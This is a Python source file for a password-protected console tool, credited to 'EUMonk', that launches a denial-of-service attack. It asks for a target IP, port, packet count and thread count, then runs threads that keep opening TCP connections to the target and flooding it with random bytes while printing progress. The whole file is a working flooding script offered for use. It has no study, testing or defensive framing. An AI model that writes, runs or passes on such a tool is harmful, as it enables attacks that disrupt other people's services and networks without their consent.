import socket
import random
import threading
import time
import os
import bcrypt
from dotenv import load_dotenv  # Load environment variables

load_dotenv()  # Load the .env file variables

# Fetch hashed passwords from environment variables
HASHED_PASSWORD1 = os.getenv("HASHED_PASSWORD1").encode()
HASHED_PASSWORD2 = os.getenv("HASHED_PASSWORD2").encode()

HASHED_PASSWORDS = [HASHED_PASSWORD1, HASHED_PASSWORD2]

def clear_screen():
    """Clears the console screen."""
    os.system("cls" if os.name == "nt" else "clear")

def print_banner():
    """Prints a banner for the application."""
    print("-------------------------------------------")
    print("            _____    ____      ____        ")
    print("              |     |    |    |    |   |   ")
    print("(dot)(dot) |     |    |    |    |   |   ")
    print("  O    O      |     |____|    |____|   |___")
    print("-------------------------------------------")
    print("First installation in the dot dot series")
    print("Made by: EUMonk - Python")
    print("-------------------------------------------")
    print("\n")

def get_ping(ip, port):
    """Calculate the ping to the specified IP and port."""
    try:
        start_time = time.time()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect((ip, port))
        s.close()
        end_time = time.time()
        ping = int((end_time - start_time) * 1000)
        return ping
    except Exception as e:
        print(f"Error: Could not connect to {ip}:{port}. Reason: {e}")
        return None  # Return None if the server is unreachable

def start_attack(ip, port, pack):
    """Execute the DoS attack."""
    hh = random._urandom(10)
    xx = 0
    while True:
        try:
            ping = get_ping(ip, port)
            if ping is None:
                print("Target is unreachable. Waiting before retrying...")
                time.sleep(10)
                continue

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(hh)
            for i in range(pack):
                s.send(hh)
            xx += 1
            print(f"Attacking {ip} | Packets sent: {xx} | Ping: {ping}ms")
            s.close()
        except Exception as e:
            print("Error: Connection failed during attack:", e)
            time.sleep(10)

def attack_menu():
    """Gather attack parameters and start DoS attack."""
    ip = input("[Q] Target IP: ")
    port = int(input("[Q] Port (must be a number): "))
    pack = int(input("[Q] Packet/s (must be a number): "))
    thread_count = int(input("[Q] Thread (must be a number): "))

    # Clear screen
    time.sleep(2)
    clear_screen()
    print_banner()

    # Start DoS attack threads
    for _ in range(thread_count):
        attack_thread = threading.Thread(target=start_attack, args=(ip, port, pack))
        attack_thread.start()

def main():
    clear_screen()
    print_banner()
    print("Welcome to the dot dot series")

    # Loop until the correct password is entered
    while True:
        password = input("Please enter the password to proceed: ")
        if any(bcrypt.checkpw(password.encode('utf-8'), hashed) for hashed in HASHED_PASSWORDS):
            print("Access granted.")
            break
        else:
            print("Access denied. Please try again.")

    while True:
        print("\nSelect an option:")
        print("1) DoS Attack")
        print("2) Exit")
        choice = input("Enter your choice: ")

        if choice == "1":
            attack_menu()
        elif choice == "2":
            print("Exiting the program.")
            break
        else:
            print("Invalid option. Please try again.")

if __name__ == "__main__":
    main()
